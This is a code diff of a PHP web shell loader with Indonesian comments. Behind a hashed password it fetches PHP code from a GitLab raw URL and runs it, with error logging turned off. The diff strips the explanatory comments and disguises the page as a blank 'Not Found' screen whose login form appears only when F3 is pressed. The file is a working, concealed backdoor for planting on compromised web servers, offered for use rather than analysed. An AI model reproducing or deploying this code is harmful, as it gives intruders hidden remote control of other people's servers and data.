@@ -1,12 +1,9 @@
 <?php
 ini_set('log_errors', 0);
 ini_set('display_errors', 0);
-// Pastikan tidak ada spasi atau baris kosong sebelum tag <?php di atas
+
 session_start();
 
-/**
- * Fungsi untuk mengambil konten dari URL luar dengan berbagai metode fallback.
- */
 function getURL($url) {
     $parsed_url = parse_url($url);
     if (!$parsed_url || !isset($parsed_url['host'])) {
@@ -18,7 +15,6 @@ function getURL($url) {
     $port = isset($parsed_url['port']) ? $parsed_url['port'] : (isset($parsed_url['scheme']) && $parsed_url['scheme'] === 'https' ? 443 : 80);
     $scheme = (isset($parsed_url['scheme']) && $parsed_url['scheme'] === 'https') ? 'ssl://' : '';
 
-    // Metode 1: cURL
     if (function_exists('curl_version')) {
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_URL, $url);
@@ -30,14 +26,14 @@ function getURL($url) {
         curl_close($ch);
         return $data;
     }
-    // Metode 2: file_get_contents
+    
     elseif (ini_get('allow_url_fopen')) {
         $context = stream_context_create([
             'http' => ['timeout' => 10, 'header' => "User-Agent: PHP\r\n"]
         ]);
         return @file_get_contents($url, false, $context);
     }
-    // Metode 3: Socket
+    
     elseif (function_exists('stream_socket_client')) {
         $socket = @stream_socket_client($scheme . $host . ':' . $port, $errno, $errstr, 10);
         if (!$socket) return false;
@@ -59,11 +55,9 @@ function generate_csrf_token() {
 }
 
 function login_shell() {
-    // Hash dari password "KOBERSERVER#"
     $password_hash = "1a84b8ba094c0c89954e86f2f518a9f32513da9b47b3619f1fba6c10fde783f2"; 
     $remote_url = "https://gitlab.com/nothing-imposible/posible/-/raw/main/alertshower.php";
 
-    // 1. Cek jika sudah login
     if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
         $code = getURL($remote_url);
         if ($code) {
@@ -74,7 +68,6 @@ function login_shell() {
         }
     }
 
-    // 2. Proses Form Login
     if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
             echo "<script>alert('Invalid CSRF token!');</script>";
@@ -82,7 +75,7 @@ function login_shell() {
             $input_password = $_POST['password'] ?? '';
             if (hash('sha256', $input_password) === $password_hash) {
                 $_SESSION['authenticated'] = true;
-                header("Location: " . $_SERVER['PHP_SELF']); // Refresh untuk menjalankan eval
+                header("Location: " . $_SERVER['PHP_SELF']);
                 exit;
             } else {
                 echo "<script>alert('Access Denied');</script>";
@@ -95,20 +88,58 @@ function login_shell() {
 <!DOCTYPE HTML>
 <html>
 <head>
-    <title>Login</title>
+    <title>Not Found</title>
     <style>
-        body { background: #000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        /* Tampilan Putih Polos */
+        body { 
+            background: #fff; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            font-family: sans-serif;
+        }
+        /* Sembunyikan form secara default */
+        #login-container {
+            display: none;
+        }
         input[type=password] { 
-            width: 250px; background: transparent; border: 1px dotted red; 
-            color: red; text-align: center; padding: 5px; outline: none;
+            width: 250px; 
+            background: transparent; 
+            border: 1px solid #ccc; 
+            color: #333; 
+            text-align: center; 
+            padding: 8px; 
+            outline: none;
+            border-radius: 4px;
         }
     </style>
 </head>
 <body>
-    <form method="post">
-        <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token); ?>">
-        <input type="password" name="password" autofocus placeholder="...">
-    </form>
+
+    <div id="login-container">
+        <form method="post" id="auth-form">
+            <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrf_token); ?>">
+            <input type="password" name="password" id="pass-field" placeholder="Enter Password">
+        </form>
+    </div>
+
+    <script>
+        // Mendengarkan input keyboard
+        window.addEventListener('keydown', function(e) {
+            // Jika tombol F3 ditekan (KeyCode 114)
+            if (e.keyCode === 114 || e.key === "F3") {
+                e.preventDefault(); // Mencegah fungsi pencarian bawaan browser
+                var container = document.getElementById('login-container');
+                var field = document.getElementById('pass-field');
+                
+                // Tampilkan form dan fokus ke input
+                container.style.display = 'block';
+                field.focus();
+            }
+        });
+    </script>
 </body>
 </html>
 <?php
